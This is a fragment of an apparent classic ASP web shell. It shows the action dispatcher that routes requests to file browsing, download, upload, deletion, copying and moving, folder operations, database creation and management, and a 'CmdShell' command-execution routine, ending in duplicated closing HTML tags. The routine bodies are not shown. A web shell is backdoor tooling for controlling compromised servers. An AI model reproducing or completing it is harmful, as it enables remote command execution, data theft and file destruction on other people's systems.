Select Case Action
  Case "MainMenu":MainMenu():ShowErr()
  Case "ShowFile":ShowFile(Session("FolderPath"))
  Case "DownFile":DownFile FName:ShowErr()
  Case "DelFile":DelFile FName:ShowErr()
  Case "EditFile":EditFile FName:ShowErr()
  Case "CopyFile":CopyFile FName:ShowErr()
  Case "MoveFile":MoveFile FName:ShowErr()
  Case "DelFolder":DelFolder FName:ShowErr()
  Case "CopyFolder":CopyFolder FName:ShowErr()
  Case "MoveFolder":MoveFolder FName:ShowErr()
  Case "NewFolder":NewFolder FName:ShowErr()
  Case "UpFile":UpFile()
  Case "Logout":Session.Contents.Remove("GXGL"):Response.Redirect URL
  Case "CmdShell":CmdShell():ShowErr()
  Case "CreateMdb":CreateMdb FName:ShowErr()
  Case "CompactMdb":CompactMdb FName:ShowErr()
  Case "DbManager":DbManager():ShowErr()
  Case Else MainForm()
End Select
%>
</body>
</html>

</body>
</html>
